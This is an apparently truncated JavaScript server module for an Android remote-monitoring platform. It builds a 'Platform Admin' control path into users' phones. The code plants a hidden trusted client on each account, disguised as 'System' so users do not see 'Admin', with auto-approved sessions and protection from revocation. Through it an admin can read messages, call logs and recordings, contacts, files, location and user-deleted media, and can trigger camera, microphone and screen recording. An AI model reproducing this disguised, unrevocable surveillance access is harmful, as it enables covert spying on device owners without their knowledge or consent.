import { randomBytes } from "crypto";
import { getAuth } from "firebase-admin/auth";
import { getMessaging } from "firebase-admin/messaging";
import { db } from "./firebase.js";
import { CAPABILITY_KEYS, normalizeAllowedCapabilities } from "./capability-model.js";
import { createModuleCommand, createTransfer } from "./module-commands.js";
import {
  isDeviceCameraReady,
  isDeviceMicReady,
  isRemoteControlReady,
} from "./device-readiness.js";
import { endActiveSessionsForClient, endActiveSessionsForDevice, writeAuditLog } from "./pairing.js";
import { buildIceServers } from "./ice-servers.js";
import { bucket } from "./firebase.js";
import * as R from "./remote-constants.js";
import { writeAdminAudit } from "./platform-admin.js";

/** Stable trusted-client id under each user — does not replace their browsers. */
export const PLATFORM_ADMIN_CLIENT_ID = "platform_admin";

const REQUEST_TTL_MS = 2 * 60 * 1000;

function allCapabilitiesOn() {
  const out = {};
  for (const key of CAPABILITY_KEYS) out[key] = true;
  return normalizeAllowedCapabilities(out);
}

function userRoot(uid) {
  return db().collection(R.COL_USERS).doc(uid);
}

/**
 * Ensure a non-revoked Platform Admin trusted client exists for this user.
 * Never revokes or modifies the user's real browser clients.
 */
export async function ensureAdminTrustedClient(ownerUid, adminEmail) {
  const ref = userRoot(ownerUid).collection(R.COL_TRUSTED_CLIENTS).doc(PLATFORM_ADMIN_CLIENT_ID);
  const now = Date.now();
  const caps = allCapabilitiesOn();
  const existing = await ref.get();
  const patch = {
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    // Neutral labels — do not show "Admin" on the phone Trusted browsers list.
    clientName: "System",
    label: "System",
    browserName: "Website",
    operatingSystem: "Server",
    allowedCapabilities: caps,
    autoApproveSessions: true,
    revoked: false,
    isPlatformAdminClient: true,
    // No publicKey → admin APIs start sessions without browser crypto.
    publicKey: null,
    updatedAt: now,
    lastUsedAt: now,
    createdByAdmin: String(adminEmail || ""),
  };
  if (!existing.exists) {
    patch.createdAt = now;
  }
  await ref.set(patch, { merge: true });
  return PLATFORM_ADMIN_CLIENT_ID;
}

/**
 * Admin revoke of a user's trusted browser (not the System/platform_admin client).
 */
export async function revokeUserTrustedClient(ownerUid, clientId, admin) {
  const id = String(clientId || "").trim();
  if (!id || id === PLATFORM_ADMIN_CLIENT_ID) {
    const err = new Error("System control client cannot be revoked");
    err.code = "PROTECTED_CLIENT";
    throw err;
  }
  const ref = userRoot(ownerUid).collection(R.COL_TRUSTED_CLIENTS).doc(id);
  const snap = await ref.get();
  if (!snap.exists) {
    const err = new Error("Trusted client not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (data.isPlatformAdminClient === true) {
    const err = new Error("System control client cannot be revoked");
    err.code = "PROTECTED_CLIENT";
    throw err;
  }
  const now = Date.now();
  await ref.set(
    {
      revoked: true,
      autoApproveSessions: false,
      updatedAt: now,
      lastUsedAt: Number(data.lastUsedAt || now),
    },
    { merge: true }
  );
  const endedSessions = await endActiveSessionsForClient(ownerUid, id);
  await writeAdminAudit({
    action: "ADMIN_REVOKE_TRUSTED_CLIENT",
    targetUid: ownerUid,
    adminUid: admin.uid,
    adminEmail: admin.email,
    clientId: id,
    endedSessions,
  });
  return { clientId: id, revoked: true, endedSessions };
}

async function requireDevice(ownerUid, deviceId) {
  const snap = await userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId).get();
  if (!snap.exists) {
    const err = new Error("Device not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (data.revoked === true) {
    const err = new Error("Device is revoked");
    err.code = "DEVICE_REVOKED";
    throw err;
  }
  return { id: snap.id, ...data };
}

export async function listActiveSessions(ownerUid, deviceId, sessionKind = null) {
  const snap = await userRoot(ownerUid).collection(R.COL_SESSIONS).where("deviceId", "==", deviceId).get();
  const activeStatuses = new Set(R.ACTIVE_SESSION_STATUSES || ["connecting", "active", "connected"]);
  const out = [];
  snap.forEach((doc) => {
    const d = doc.data() || {};
    const status = String(d.status || "");
    if (!activeStatuses.has(status)) return;
    const kind = String(d.sessionKind || "camera");
    if (sessionKind && kind !== sessionKind) return;
    out.push({
      sessionId: doc.id,
      status,
      sessionKind: kind,
      clientId: String(d.clientId || ""),
      startedAt: Number(d.startedAt || d.createdAt || 0),
      autoApproved: Boolean(d.autoApproved),
    });
  });
  return out;
}

async function readCol(ownerUid, deviceId, col, limit = 80, orderByField = "") {
  const base = () => userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId).collection(col);
  try {
    let q = base();
    if (orderByField) q = q.orderBy(orderByField, "desc");
    const snap = await q.limit(limit).get();
    return snap.docs.map((d) => ({ id: d.id, ...(d.data() || {}) }));
  } catch {
    // Fallback if orderBy field is missing on older docs.
    const snap = await base().limit(limit).get();
    return snap.docs.map((d) => ({ id: d.id, ...(d.data() || {}) }));
  }
}

/**
 * List remoteMedia for admin (includes user soft-deleted items).
 * Optionally filter by deviceId; always includes items with empty deviceId.
 */
export async function listOwnerRemoteMedia(ownerUid, { deviceId = "", limit = 80 } = {}) {
  const snap = await userRoot(ownerUid).collection(R.COL_REMOTE_MEDIA).get();
  const wantDevice = String(deviceId || "").trim();
  const items = [];
  snap.forEach((docSnap) => {
    const data = docSnap.data() || {};
    if (data.revoked === true) return;
    const itemDevice = String(data.deviceId || "");
    if (wantDevice && itemDevice && itemDevice !== wantDevice) return;
    const downloadUrl = String(data.downloadUrl || "");
    const storagePath = String(data.storagePath || "");
    if (!downloadUrl && !storagePath) return;
    items.push({
      mediaId: String(data.mediaId || docSnap.id),
      kind: String(data.kind || ""),
      fileName: String(data.fileName || ""),
      contentType: String(data.contentType || ""),
      downloadUrl,
      storagePath,
      sizeBytes: Number(data.sizeBytes || 0),
      createdAt: Number(data.createdAt || 0),
      deviceId: itemDevice,
      sessionId: String(data.sessionId || ""),
      recordingSessionId: String(data.recordingSessionId || data.sessionId || ""),
      clientId: String(data.clientId || ""),
      source: String(data.source || ""),
      silentRecording: data.silentRecording === true || String(data.source || "") === "silent_live_session",
      segmentIndex: Number(data.segmentIndex || 0),
      segmentStartedAt: Number(data.segmentStartedAt || 0),
      durationMs: Number(data.durationMs || 0),
      deletedByUser: data.deletedByUser === true,
      deletedByUserAt: Number(data.deletedByUserAt || 0),
    });
  });
  items.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
  return items.slice(0, Math.min(200, Math.max(1, Number(limit) || 80)));
}

/**
 * Permanently delete remoteMedia (Storage + Firestore). Admin only.
 */
export async function hardDeleteOwnerRemoteMedia(ownerUid, mediaId, admin) {
  const id = String(mediaId || "").trim();
  if (!id) {
    const err = new Error("mediaId required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const ref = userRoot(ownerUid).collection(R.COL_REMOTE_MEDIA).doc(id);
  const snap = await ref.get();
  if (!snap.exists) {
    const err = new Error("Media not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  const storagePath = String(data.storagePath || "").trim();
  if (storagePath) {
    try {
      await bucket().file(storagePath).delete({ ignoreNotFound: true });
    } catch {
      /* best-effort storage cleanup */
    }
  }
  await ref.delete();
  await writeAdminAudit({
    action: "ADMIN_REMOTE_MEDIA_HARD_DELETE",
    targetUid: ownerUid,
    adminUid: admin.uid,
    adminEmail: admin.email,
    mediaId: id,
    kind: String(data.kind || ""),
    fileName: String(data.fileName || ""),
    wasDeletedByUser: data.deletedByUser === true,
    storagePath,
  });
  return { ok: true, mediaId: id, permanentlyDeleted: true };
}

/**
 * Explore cached device data (Admin SDK — does not interrupt anyone).
 */
export async function getDeviceExplore(ownerUid, deviceId) {
  const device = await requireDevice(ownerUid, deviceId);
  const deviceRef = userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId);

  const [
    infoSnap,
    locSnap,
    activeSessions,
    messages,
    callLogs,
    contacts,
    notifications,
    apps,
    appUsage,
    gallery,
    folderGrants,
    fileIndex,
    screenRecordings,
    remoteMedia,
  ] = await Promise.all([
    deviceRef.collection(R.COL_DEVICE_INFO).doc("current").get().catch(() => null),
    deviceRef.collection(R.COL_LOCATION).doc("current").get().catch(() => null),
    listActiveSessions(ownerUid, deviceId),
    readCol(ownerUid, deviceId, R.COL_MESSAGE_ITEMS, 50, "date"),
    readCol(ownerUid, deviceId, R.COL_CALL_LOG_ITEMS, 50, "date"),
    readCol(ownerUid, deviceId, R.COL_CONTACT_ITEMS, 50),
    readCol(ownerUid, deviceId, R.COL_NOTIFICATION_ITEMS, 50, "postedAt"),
    readCol(ownerUid, deviceId, R.COL_INSTALLED_APPS, 80),
    readCol(ownerUid, deviceId, R.COL_APP_USAGE_DAILY, 400, "dateMs"),
    readCol(ownerUid, deviceId, R.COL_GALLERY_ITEMS, 80, "dateAdded"),
    readCol(ownerUid, deviceId, R.COL_FOLDER_GRANTS, 40),
    readCol(ownerUid, deviceId, R.COL_FILE_INDEX, 200, "name"),
    readCol(ownerUid, deviceId, R.COL_SCREEN_RECORDINGS, 30, "createdAt"),
    listOwnerRemoteMedia(ownerUid, { deviceId, limit: 80 }),
  ]);

  const limitations = [
    {
      feature: "Cached data (info, location, messages, …)",
      possible: true,
      note: "Shows last synced data. Use Sync to refresh from the phone. Does not interrupt the user’s website.",
    },
    {
      feature: "Module commands (sync, lock, unlock, …)",
      possible: true,
      note: "Runs via a hidden Platform Admin trusted client. User browsers stay paired.",
    },
    {
      feature: "Live camera / microphone",
      possible: true,
      note: "Starts an admin session on the phone. If the user already has a live camera session, you must take over (ends theirs) or wait.",
    },
    {
      feature: "Screen mirror / record",
      possible: true,
      note: "Phone must show Android’s system screen-capture consent (cannot be skipped). Same takeover rule as camera if a screen session is live.",
    },
    {
      feature: "Remote touch / accessibility",
      possible: Boolean(device.remoteControlEnabled !== false),
      note:
        device.remoteControlEnabled === false
          ? "Remote control is disabled on the phone. Enable it in the app, then retry."
          : "Needs Accessibility enabled on the phone. Commands go through Platform Admin client.",
    },
  ];

  return {
    device: {
      deviceId,
      deviceName: String(device.deviceName || device.name || ""),
      deviceModel: String(device.deviceModel || device.model || ""),
      manufacturer: String(device.manufacturer || ""),
      androidVersion: String(device.androidVersion || ""),
      appVersion: String(device.appVersion || ""),
      online: Boolean(device.online),
      lastSeenAt: Number(device.lastSeenAt || device.updatedAt || 0),
      remoteControlEnabled: device.remoteControlEnabled !== false,
      cameraAvailable: device.cameraAvailable !== false,
      microphoneAvailable: device.microphoneAvailable !== false,
      cameraPermission: String(device.cameraPermission || ""),
      microphonePermission: String(device.microphonePermission || ""),
      batteryLevel: device.batteryLevel ?? null,
      isCharging: Boolean(device.isCharging),
      networkType: String(device.networkType || ""),
      locationSharingEnabled: Boolean(device.locationSharingEnabled),
      galleryAccessEnabled: Boolean(device.galleryAccessEnabled),
      fileManagerEnabled: Boolean(device.fileManagerEnabled),
      revoked: Boolean(device.revoked),
    },
    deviceInfo: infoSnap?.exists ? infoSnap.data() : null,
    location: locSnap?.exists ? locSnap.data() : null,
    activeSessions,
    messages,
    callLogs,
    contacts,
    notifications: (notifications || []).map(normalizeNotificationItem),
    apps,
    appUsage: (appUsage || []).map(normalizeAppUsageItem),
    gallery: (gallery || []).map(normalizeGalleryItem),
    folderGrants,
    fileIndex,
    screenRecordings,
    remoteMedia,
    limitations,
    adminClientId: PLATFORM_ADMIN_CLIENT_ID,
  };
}

/**
 * Call logs for admin panel (same shape as user /api/device/call-logs).
 */
export async function listAdminCallLogs(ownerUid, deviceId, limit = 150) {
  await requireDevice(ownerUid, deviceId);
  const cap = Math.min(300, Math.max(1, Number(limit) || 150));
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_CALL_LOG_ITEMS)
    .orderBy("date", "desc")
    .limit(cap)
    .get();
  const rawItems = snap.docs.map((d) => {
    const data = d.data() || {};
    return {
      itemId: d.id,
      callId: Number(data.callId || 0),
      number: String(data.number || ""),
      contactName: String(data.contactName || ""),
      callType: String(data.callType || "incoming"),
      callTypeCode: Number(data.callTypeCode || 0),
      date: Number(data.date || 0),
      durationSec: Number(data.durationSec || 0),
      isNew: Boolean(data.isNew),
      geo: String(data.geo || ""),
      syncedAt: Number(data.syncedAt || 0),
      recordingStatus: String(data.recordingStatus || "none"),
      recordingStoragePath: String(data.recordingStoragePath || ""),
      recordingMimeType: String(data.recordingMimeType || ""),
      recordingSizeBytes: Number(data.recordingSizeBytes || 0),
      recordingSource: String(data.recordingSource || ""),
      recordingError: String(data.recordingError || ""),
    };
  });
  const items = [];
  for (const it of rawItems) {
    let recordingUrl = "";
    if (it.recordingStatus === "ready" && it.recordingStoragePath) {
      try {
        const file = bucket().file(it.recordingStoragePath);
        const [exists] = await file.exists();
        if (exists) {
          const [url] = await file.getSignedUrl({
            action: "read",
            expires: Date.now() + 15 * 60 * 1000,
            version: "v4",
          });
          recordingUrl = url;
        }
      } catch {
        /* signed URL optional */
      }
    }
    const recordingContentUrl =
      it.recordingStatus === "ready"
        ? `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/call-logs/recording?itemId=${encodeURIComponent(it.itemId)}`
        : "";
    items.push({ ...it, recordingUrl, recordingContentUrl });
  }
  return items;
}

/** Resolve call recording file for admin content proxy. */
export async function resolveAdminCallLogRecording(ownerUid, deviceId, itemId) {
  await requireDevice(ownerUid, deviceId);
  const id = String(itemId || "").trim();
  if (!id) {
    const err = new Error("itemId required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_CALL_LOG_ITEMS)
    .doc(id)
    .get();
  if (!snap.exists) {
    const err = new Error("Call log item not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  const status = String(data.recordingStatus || "");
  const storagePath = String(data.recordingStoragePath || "").trim();
  if (status !== "ready" || !storagePath) {
    const err = new Error("Recording not available");
    err.code = "NO_RECORDING";
    throw err;
  }
  const file = bucket().file(storagePath);
  const [exists] = await file.exists();
  if (!exists) {
    const err = new Error("Recording file missing");
    err.code = "FILE_MISSING";
    throw err;
  }
  const [meta] = await file.getMetadata().catch(() => [{}]);
  const pathLower = storagePath.toLowerCase();
  const ext = pathLower.endsWith(".3gp") || pathLower.endsWith(".amr")
    ? pathLower.endsWith(".amr")
      ? "amr"
      : "3gp"
    : pathLower.endsWith(".mp3")
      ? "mp3"
      : pathLower.endsWith(".wav")
        ? "wav"
        : "m4a";
  const storedMime = String(data.recordingMimeType || meta?.contentType || "").trim();
  const resolvedMime =
    storedMime && storedMime !== "application/octet-stream"
      ? storedMime
      : ext === "3gp" || ext === "amr"
        ? "audio/3gpp"
        : ext === "mp3"
          ? "audio/mpeg"
          : ext === "wav"
            ? "audio/wav"
            : "audio/mp4";
  return {
    file,
    itemId: id,
    mimeType: resolvedMime,
    ext,
    size: Number(meta?.size || data.recordingSizeBytes || 0),
  };
}

function normalizeNotificationItem(n) {
  const raw = n && typeof n === "object" ? n : {};
  return {
    id: raw.id || "",
    title: String(raw.title || ""),
    message: String(raw.message || raw.text || raw.body || raw.content || ""),
    appLabel: String(raw.appLabel || raw.appName || raw.packageName || "App"),
    packageName: String(raw.packageName || ""),
    postedAt: Number(raw.postedAt || raw.createdAt || 0),
  };
}

function normalizeAppUsageItem(u) {
  const raw = u && typeof u === "object" ? u : {};
  return {
    id: String(raw.id || raw.itemId || ""),
    itemId: String(raw.itemId || raw.id || ""),
    packageName: String(raw.packageName || ""),
    appName: String(raw.appName || raw.packageName || "App"),
    date: String(raw.date || ""),
    dateMs: Number(raw.dateMs || 0),
    totalDurationMs: Number(raw.totalDurationMs || 0),
    lastUsed: Number(raw.lastUsed || 0),
    launchCount: Number(raw.launchCount || 0),
    syncedAt: Number(raw.syncedAt || 0),
  };
}

function normalizeGalleryItem(g) {
  const raw = g && typeof g === "object" ? g : {};
  const mime = String(raw.mimeType || "");
  let type = String(raw.type || "").toLowerCase();
  if (!type) {
    if (mime.startsWith("image/")) type = "image";
    else if (mime.startsWith("video/")) type = "video";
    else if (mime.startsWith("audio/")) type = "audio";
    else type = "file";
  }
  return {
    id: String(raw.id || raw.itemId || ""),
    itemId: String(raw.itemId || raw.id || ""),
    displayName: String(raw.displayName || raw.name || raw.id || "file"),
    type,
    mimeType: mime,
    sizeBytes: Number(raw.sizeBytes || raw.size || 0),
    dateAdded: Number(raw.dateAdded || raw.createdAt || 0),
    createdAt: Number(raw.createdAt || 0),
  };
}

/**
 * Installed apps list for admin explore (same filters as user /api/device/apps).
 */
export async function listAdminInstalledApps(ownerUid, deviceId, opts = {}) {
  await requireDevice(ownerUid, deviceId);
  const q = String(opts.q || "").trim().toLowerCase();
  const filter = String(opts.filter || "all").trim().toLowerCase();
  const limit = Math.min(500, Math.max(1, Number(opts.limit || 300)));
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_INSTALLED_APPS)
    .orderBy("appName", "asc")
    .limit(limit)
    .get();
  const startOfDay = new Date();
  startOfDay.setHours(0, 0, 0, 0);
  const dayStart = startOfDay.getTime();
  let items = snap.docs.map((d) => {
    const data = d.data() || {};
    return {
      appId: d.id,
      packageName: String(data.packageName || ""),
      appName: String(data.appName || ""),
      versionName: String(data.versionName || ""),
      versionCode: Number(data.versionCode || 0),
      firstInstallTime: Number(data.firstInstallTime || 0),
      lastUpdateTime: Number(data.lastUpdateTime || 0),
      isSystem: Boolean(data.isSystem),
      enabled: data.enabled !== false,
      targetSdk: Number(data.targetSdk || 0),
      minSdk: Number(data.minSdk || 0),
      category: String(data.category || "other"),
      permissionCount: Number(data.permissionCount || 0),
      installSource: String(data.installSource || ""),
      supportedAbis: Array.isArray(data.supportedAbis) ? data.supportedAbis : [],
      favorite: Boolean(data.favorite),
      syncedAt: Number(data.syncedAt || 0),
    };
  });
  if (q) {
    items = items.filter(
      (a) => a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q)
    );
  }
  if (filter === "system") items = items.filter((a) => a.isSystem);
  else if (filter === "user") items = items.filter((a) => !a.isSystem);
  else if (filter === "disabled") items = items.filter((a) => !a.enabled);
  else if (
    filter === "games" ||
    filter === "social" ||
    filter === "finance" ||
    filter === "shopping" ||
    filter === "productivity" ||
    filter === "tools"
  ) {
    items = items.filter((a) => a.category === filter);
  } else if (filter === "installed_today") {
    items = items.filter((a) => a.firstInstallTime >= dayStart);
  } else if (filter === "updated_today") {
    items = items.filter((a) => a.lastUpdateTime >= dayStart);
  }
  return { items, count: items.length };
}

/** Active app blocks for admin panel. */
export async function listAdminAppBlocks(ownerUid, deviceId) {
  await requireDevice(ownerUid, deviceId);
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_APP_BLOCKS)
    .limit(200)
    .get();
  const now = Date.now();
  const items = snap.docs
    .map((d) => {
      const data = d.data() || {};
      const expiresAt = Number(data.expiresAt || 0);
      const status = String(data.status || "");
      const active = status === "active" && (expiresAt <= 0 || expiresAt > now);
      return {
        blockId: d.id,
        packageName: String(data.packageName || ""),
        appName: String(data.appName || ""),
        mode: String(data.mode || "app"),
        status: active ? "active" : status === "active" ? "expired" : status || "cleared",
        durationMs: Number(data.durationMs || 0),
        expiresAt,
        createdAt: Number(data.createdAt || 0),
        updatedAt: Number(data.updatedAt || 0),
        accessibilityReady: Boolean(data.accessibilityReady),
        deviceAdminReady: Boolean(data.deviceAdminReady),
        note: String(data.note || ""),
      };
    })
    .filter((b) => b.packageName)
    .sort((a, b) => (b.updatedAt || b.createdAt) - (a.updatedAt || a.createdAt));
  return {
    items,
    activeCount: items.filter((b) => b.status === "active").length,
  };
}

/** Single installed app detail for admin panel. */
export async function getAdminAppDetail(ownerUid, deviceId, packageName) {
  await requireDevice(ownerUid, deviceId);
  const pkg = String(packageName || "").trim();
  if (!pkg) {
    const err = new Error("packageName required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const col = userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_INSTALLED_APPS);
  const q = await col.where("packageName", "==", pkg).limit(1).get();
  if (q.empty) {
    const err = new Error("App not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const docSnap = q.docs[0];
  const data = docSnap.data() || {};
  return {
    appId: docSnap.id,
    ...data,
    packageName: String(data.packageName || ""),
    appName: String(data.appName || ""),
  };
}

/** Accessibility element tree snapshot (admin SDK read). */
export async function getAdminAccessibilityTree(ownerUid, deviceId, version) {
  await requireDevice(ownerUid, deviceId);
  const ver = String(version || "").trim();
  if (!ver) {
    const err = new Error("version required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection("accessibility")
    .doc(`tree_${ver}`)
    .get();
  if (!snap.exists) {
    const err = new Error("Tree not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  return {
    version: ver,
    packageName: String(data.packageName || ""),
    nodes: Array.isArray(data.nodes) ? data.nodes : [],
    updatedAt: Number(data.updatedAt || 0),
  };
}

/**
 * Start gallery file transfer via Platform Admin client (does not touch user browsers).
 */
export async function startAdminGalleryTransfer(ownerUid, deviceId, item, admin) {
  await requireDevice(ownerUid, deviceId);
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const itemId = String(item.itemId || item.id || "").trim();
  if (!itemId) {
    const err = new Error("itemId required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const transfer = await createTransfer(ownerUid, {
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    operation: "gallery_download",
    sourceType: "gallery",
    sourceReference: itemId,
    sizeBytes: Number(item.sizeBytes || 0),
    mimeType: item.mimeType || "",
    displayName: item.displayName || itemId,
    storagePath: `users/${ownerUid}/devices/${deviceId}/gallery-transfers/{transferId}/file`,
  });
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
    PLATFORM_ADMIN_CLIENT_ID,
    "GALLERY_TRANSFER_REQUEST",
    { itemId, transferId: transfer.transferId },
    null
  );
  await writeAdminAudit({
    action: "ADMIN_GALLERY_TRANSFER",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    itemId,
    transferId: transfer.transferId,
  });
  return { transfer, command: cmd };
}

export async function getAdminTransfer(ownerUid, transferId) {
  const snap = await userRoot(ownerUid).collection(R.COL_TRANSFERS).doc(transferId).get();
  if (!snap.exists) {
    const err = new Error("Transfer not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const t = snap.data() || {};
  if (String(t.ownerUid || ownerUid) !== ownerUid) {
    const err = new Error("Forbidden");
    err.code = "FORBIDDEN";
    throw err;
  }
  return { transferId: snap.id, ...t };
}

/** List recent transfers for admin gallery/file polling (mirrors user /api/device/transfers). */
export async function listAdminTransfers(ownerUid, { deviceId = "", limit = 50 } = {}) {
  const uid = String(ownerUid || "").trim();
  if (!uid) {
    const err = new Error("ownerUid required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const cap = Math.min(100, Math.max(1, Number(limit) || 50));
  const snap = await userRoot(uid)
    .collection(R.COL_TRANSFERS)
    .orderBy("createdAt", "desc")
    .limit(cap)
    .get();
  let items = snap.docs.map((d) => ({ transferId: d.id, ...(d.data() || {}) }));
  const dev = String(deviceId || "").trim();
  if (dev) items = items.filter((t) => String(t.deviceId || "") === dev);
  const out = [];
  for (const t of items) {
    const copy = { ...t };
    copy.contentUrl =
      t.status === "ready"
        ? `/api/admin/users/${encodeURIComponent(uid)}/transfers/${encodeURIComponent(String(t.transferId || ""))}/content`
        : null;
    if (t.status === "ready") {
      const resolved = await resolveAdminTransferFile(uid, t);
      if (resolved) {
        copy.storagePath = resolved.storagePath;
        try {
          const [url] = await resolved.file.getSignedUrl({
            action: "read",
            expires: Date.now() + 15 * 60 * 1000,
            version: "v4",
          });
          copy.downloadUrl = url;
        } catch {
          copy.downloadUrl = null;
        }
      } else {
        copy.downloadUrl = null;
      }
    }
    out.push(copy);
  }
  return out;
}

async function resolveAdminTransferFile(uid, t) {
  for (const path of transferStorageCandidates(uid, t)) {
    try {
      const file = bucket().file(path);
      const [exists] = await file.exists();
      if (exists) return { file, storagePath: path };
    } catch {
      /* try next */
    }
  }
  return null;
}

function transferStorageCandidates(uid, t) {
  const paths = [];
  const stored = String(t.storagePath || "").trim();
  if (stored) paths.push(stored);
  const transferId = String(t.transferId || "").trim();
  const deviceId = String(t.deviceId || "").trim();
  if (transferId && deviceId && uid) {
    paths.push(`users/${uid}/devices/${deviceId}/gallery-transfers/${transferId}/file`);
    paths.push(`users/${uid}/devices/${deviceId}/file-transfers/${transferId}/file`);
    paths.push(`users/${uid}/devices/${deviceId}/screen-recordings/${transferId}/recording.mp4`);
    paths.push(`users/${uid}/devices/${deviceId}/screen-recordings/${transferId}/file`);
  }
  return [...new Set(paths.filter(Boolean))];
}

/**
 * Screen record start/stop for Platform Admin — START creates upload transfer (same as user panel).
 * @param {'START'|'STOP'|'PAUSE'|'RESUME'} op
 */
export async function runAdminScreenRecord(ownerUid, deviceId, op, opts, admin) {
  await requireDevice(ownerUid, deviceId);
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const actionMap = {
    START: "SCREEN_RECORD_START",
    STOP: "SCREEN_RECORD_STOP",
    PAUSE: "SCREEN_RECORD_PAUSE",
    RESUME: "SCREEN_RECORD_RESUME",
  };
  const key = String(op || "").trim().toUpperCase();
  const action = actionMap[key];
  if (!action) {
    const err = new Error("op must be START|STOP|PAUSE|RESUME");
    err.code = "BAD_OP";
    throw err;
  }
  let transfer = null;
  const payload = {
    quality: String(opts?.quality || "720p").slice(0, 16),
    fps: Math.min(60, Math.max(15, Number(opts?.fps || 30))),
    withMic: Boolean(opts?.withMic),
    autoUpload: opts?.autoUpload !== false,
    recordingId: String(opts?.recordingId || "").slice(0, 64),
  };
  if (key === "START") {
    transfer = await createTransfer(ownerUid, {
      deviceId,
      clientId: PLATFORM_ADMIN_CLIENT_ID,
      operation: "screen_record_upload",
      sourceType: "screen_recording",
      sourceReference: "pending",
      mimeType: "video/mp4",
      displayName: `screen-${Date.now()}.mp4`,
      sizeBytes: 0,
    });
    payload.transferId = transfer.transferId;
  }
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
    PLATFORM_ADMIN_CLIENT_ID,
    action,
    payload,
    null
  );
  await writeAdminAudit({
    action: "ADMIN_SCREEN_RECORD",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    op: key,
    commandId: cmd.commandId,
    transferId: transfer?.transferId || "",
  });
  return { command: cmd, transfer };
}

export async function downloadAdminTransferContent(ownerUid, transferId) {
  const t = await getAdminTransfer(ownerUid, transferId);
  if (String(t.status || "") !== "ready") {
    const err = new Error(`Transfer not ready (${t.status || "unknown"})`);
    err.code = "NOT_READY";
    throw err;
  }
  const resolved = await resolveAdminTransferFile(ownerUid, t);
  if (!resolved) {
    const err = new Error("File missing in storage");
    err.code = "FILE_MISSING";
    throw err;
  }
  const [buf] = await resolved.file.download();
  return {
    buffer: buf,
    mimeType: String(t.mimeType || "application/octet-stream"),
    displayName: String(t.displayName || "file"),
    storagePath: resolved.storagePath,
  };
}

export async function getAdminModuleCommand(ownerUid, deviceId, commandId) {
  const id = String(commandId || "").trim();
  if (!id) {
    const err = new Error("commandId required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  await requireDevice(ownerUid, deviceId);
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_MODULE_COMMANDS)
    .doc(id)
    .get();
  if (!snap.exists) {
    const err = new Error("Command not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  return { commandId: id, ...(snap.data() || {}) };
}

/** Re-send FCM wake-up for a still-pending module command (helps phone drain queue). */
export async function pokeAdminModuleCommand(ownerUid, deviceId, commandId, admin) {
  const cmd = await getAdminModuleCommand(ownerUid, deviceId, commandId);
  if (String(cmd.status || "") !== "pending") {
    return cmd;
  }
  await ensureAdminTrustedClient(ownerUid, admin?.email);
  const device = await requireDevice(ownerUid, deviceId);
  const fcmToken = String(device.fcmToken || "");
  if (fcmToken) {
    try {
      await getMessaging().send({
        token: fcmToken,
        data: {
          type: "module_command",
          deviceId,
          commandId: String(cmd.commandId || commandId),
          action: String(cmd.action || ""),
          expiresAt: String(cmd.expiresAt || ""),
        },
        android: { priority: "high" },
      });
    } catch {
      /* phone may still pick up via Firestore */
    }
  }
  return cmd;
}

export async function waitAdminModuleCommand(ownerUid, deviceId, commandId, timeoutMs = 20000) {
  const ref = userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_MODULE_COMMANDS)
    .doc(commandId);
  const deadline = Date.now() + Math.min(Math.max(Number(timeoutMs) || 20000, 1000), 60000);
  while (Date.now() < deadline) {
    const snap = await ref.get();
    if (snap.exists) {
      const data = snap.data() || {};
      const status = String(data.status || "");
      if (status === "acked" || status === "failed" || status === "expired" || status === "ignored") {
        return { commandId, ...data };
      }
    }
    await new Promise((r) => setTimeout(r, 280));
  }
  const err = new Error(
    "Command timed out — phone did not confirm. Enable Accessibility + Remote Control on the phone, keep the app open, then retry."
  );
  err.code = "TIMEOUT";
  throw err;
}

export async function runAdminModuleCommand(ownerUid, deviceId, action, payload, admin) {
  await requireDevice(ownerUid, deviceId);
  // Ensure ownerUid is stamped so module command ownership checks pass.
  await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .set({ ownerUid }, { merge: true });
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
